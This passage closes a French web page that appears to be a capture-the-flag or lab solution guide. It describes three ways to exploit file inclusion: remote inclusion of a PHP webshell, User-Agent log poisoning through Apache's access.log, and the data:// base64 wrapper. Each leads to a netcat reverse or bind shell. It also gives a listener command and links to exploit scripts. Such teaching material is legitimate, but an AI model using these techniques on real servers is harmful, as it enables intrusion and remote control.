<p>Il existe trois moyens d'exploiter cette vulnérabilité :</p>
<ul>
<li><em>RFI par inclusion de fichiers distants</em> : il s'agit ici d'inclure un fichier distant, contenant notre payload PHP au format texte. Pour cela, on peut mettre en place un serveur de fichiers statique au travers de la commande <code>python -m SimpleHTTPServer</code>, et inclure directement l'URL de notre fichier malveillant pour obtenir un webshell. En manipulant l'argument cmd, on peut alors mettre en place grâce à netcat un bind shell ou un reverse shell. </li>
<li><em>LFI par inclusion de fichiers logs</em> : on peut envoyer une première requête quelconque, dont le User Agent a été modifié pour contenir notre payload PHP. Notre payload est donc inclus dans le fichier de journalisation d'Apache nommé "access.log" (on choisit d'insérer le payload dans le User Agent pour éviter que le payload ne soit dégradé par l'URL encoding). Dès lors, une simple requête d'inclusion des logs via la LFI nous permet d'exécuter n'importe quelle commande bash, et donc de mettre en place un bind ou un reverse shell. </li>
<li><em>LFI par inclusion de PHP wrapper</em> : on se sert ici de la fonctionnalité des PHP wrappers (des fonctions PHP se comportant comme des fichiers) pour inclure notre payload PHP. On a fait le choix, ici, d'utiliser le wrapper <code>data://text/plain;base64,</code>, suivi du payload PHP encodé en base64. Dès lors, il nous suffit de manipuler l'argument cmd pour entrer une commande bash, nous pouvons utiliser netcat pour déployer un bind ou un reverse shell. </li>
</ul>
<p>Pour illustrer ces différentes techniques d'exploitation, nous vous proposons les trois scripts python suivants. Nous avons fait le choix arbitraire de mettre en place des reverse shells, il faudra donc avoir un netcat en écoute de lancé sur votre ordinateur. Par exemple, pour mettre un netcat en écoute sur le port 4444 :</p>
<p style="text-align:center"><code>nc -lvp 4444</code></p>
<p>La syntaxe des différents scripts est toujours la même, vous devrez indiquer en premier argument votre adresse IP et en second argument le numéro de port sur lequel vous avez lancé votre netcat en écoute :</p>
<p style="text-align:center"><code>Usage : python exploit_???.py &lt;local IP&gt; &lt;local Port&gt;</code></p>
<p>Cliquez sur un des boutons ci dessous pour télécharger le script correspondant :</p>
				<div class="row" style="margin:10px;text-align:center;">
                                        <div class="col-md-4 col-sm-4 col-xs-12">
                                            <a href="assets/scripts/exploit_lfi.py" class="scrollto btn btn-purple"><span class="icon icon_document"></span> LFI par inclusion de fichiers logs</a>
					</div>
                                        <div class="col-md-4 col-sm-4 col-xs-12">
                                            <a href="assets/scripts/exploit_lfi_wrapper.py" class="scrollto btn btn-purple"><span class="icon icon_document"></span> LFI par inclusion de PHP Wrappers</a>
					</div>
                                        <div class="col-md-4 col-sm-4 col-xs-12">
                                            <a href="assets/scripts/exploit_rfi.py" class="scrollto btn btn-purple"><span class="icon icon_document"></span> RFI par inclusion de fichiers distants</a>
					</div>    
					                                             
                                </div>

				</div>
                                </div><!--//section-block-->
                       </section><!--//doc-section-->
                    </div><!--//doc-content-->
                    <div class="doc-sidebar">
                        <nav id="doc-nav">
                            <ul id="doc-menu" class="nav doc-menu hidden-xs" data-spy="affix">
                                <li><a class="scrollto" href="#presentation">Présentation</a></li>
                                <li><a class="scrollto" href="#expert">Niveau Expert</a></li>
                                <li><a class="scrollto" href="#intermediaire">Niveau Intermédiaire</a></li>
				<ul class="nav doc-sub-menu">
		                        <li><a class="scrollto" href="#scandeports">Scan de ports</a></li>
		                        <li><a class="scrollto" href="#recherchevuln">Recherche de la vulnérabilité</a></li>
					<li><a class="scrollto" href="#exploitation-inter">Exploitation</a></li>
<li><a class="scrollto" href="#webshell2interactiveshell">Du Webshell au Shell Interactif</a></li>				    </ul>
                                <li><a class="scrollto" href="#debutant">Niveau Débutant</a></li>
                                    <ul class="nav doc-sub-menu">
		                        <li><a class="scrollto" href="#collectedinfos">Collecte d'informations</a></li>
		                        <li><a class="scrollto" href="#exploitation">Exploitation</a></li>
				    </ul>
                                <li><a class="scrollto" href="#solution">La Solution</a></li>
                            </ul><!--//doc-menu-->
                        </nav>
                    </div><!--//doc-sidebar-->
                </div><!--//doc-body-->              
            </div><!--//container-->
        </div><!--//doc-wrapper-->
        

        
    </div><!--//page-wrapper-->
    
    <footer id="footer" class="footer text-center">
        <div class="container">
            <!--/* This template is released under the Creative Commons Attribution 3.0 License. Please keep the attribution link below when using for your own project. Thank you for your support. :) If you'd like to use the template without the attribution, you can check out other license options via our website: themes.3rdwavemedia.com */-->
            <small class="copyright">Développé avec <i class="fa fa-heart"></i> par Romain Cayre et Huon Duong Tran</small>
            
        </div><!--//container-->
    </footer><!--//footer-->
    
     
    <!-- Main Javascript -->         
    <script type="text/javascript">
	function switcherSolution() {
		bouton = document.querySelector('#btnsolution');
		solution = document.querySelector('#lasolutioncachee');
		if (solution.style.display == "none") {
			solution.style.display = "block";
			bouton.innerHTML = "Masquer la solution";		
		}
		else {
			solution.style.display = "none";
			bouton.innerHTML = "Afficher la solution";
		}
	}
    </script> 
    <script type="text/javascript" src="assets/plugins/jquery-1.12.3.min.js"></script>
    <script type="text/javascript" src="assets/plugins/bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="assets/plugins/prism/prism.js"></script>    
    <script type="text/javascript" src="assets/plugins/jquery-scrollTo/jquery.scrollTo.min.js"></script>  
    <script type="text/javascript" src="assets/plugins/lightbox/dist/ekko-lightbox.min.js"></script>                                                                 
    <script type="text/javascript" src="assets/plugins/jquery-match-height/jquery.matchHeight-min.js"></script>
    <script type="text/javascript" src="assets/js/main.js"></script>
    
</body>
</html> 

